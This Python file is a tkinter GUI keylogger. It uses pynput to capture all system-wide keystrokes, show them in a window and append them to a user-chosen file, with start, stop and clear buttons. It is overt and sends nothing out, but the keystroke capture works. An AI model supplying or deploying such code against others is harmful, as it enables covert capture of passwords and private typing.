import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""

        self.root = tk.Tk()
        self.root.title("Keylogger")
        self.root.geometry("500x400")
        self.root.configure(bg="#f0f0f0")

        # Create a frame for better layout management
        self.frame = tk.Frame(self.root, bg="#f0f0f0")
        self.frame.pack(fill="both", expand=True, padx=20, pady=20)

        # Textbox for logging keys
        self.textbox = tk.Text(self.frame, wrap="word", height=15, font=("Arial", 12), bg="#ffffff")
        self.textbox.pack(fill="both", expand=True)

        # Status label
        self.status_label = tk.Label(self.frame, text="Logging Stopped", fg="red", bg="#f0f0f0", font=("Arial", 14))
        self.status_label.pack(pady=5)

        # Button styling
        button_style = {"font": ("Arial", 12), "bg": "#007BFF", "fg": "#ffffff", "width": 15}

        # Control buttons
        self.start_button = tk.Button(self.frame, text="Start Logging", command=self.start_logging, **button_style)
        self.start_button.pack(side="left", padx=5, pady=5)

        self.stop_button = tk.Button(self.frame, text="Stop Logging", command=self.stop_logging, state="disabled", **button_style)
        self.stop_button.pack(side="left", padx=5, pady=5)

        self.clear_button = tk.Button(self.frame, text="Clear Logs", command=self.clear_logs, **button_style)
        self.clear_button.pack(side="left", padx=5, pady=5)

        self.save_button = tk.Button(self.frame, text="Choose File", command=self.choose_file, **button_style)
        self.save_button.pack(side="left", padx=5, pady=5)

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)  # Automatically scroll down
        with open(self.filename, 'a') as logs:
            logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if self.filename:
                self.is_logging = True
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.status_label.config(text="Logging Started", fg="green")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.status_label.config(text="Logging Stopped", fg="red")
            self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                      filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not self.filename:
            messagebox.showwarning("Warning", "No file selected!")

    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
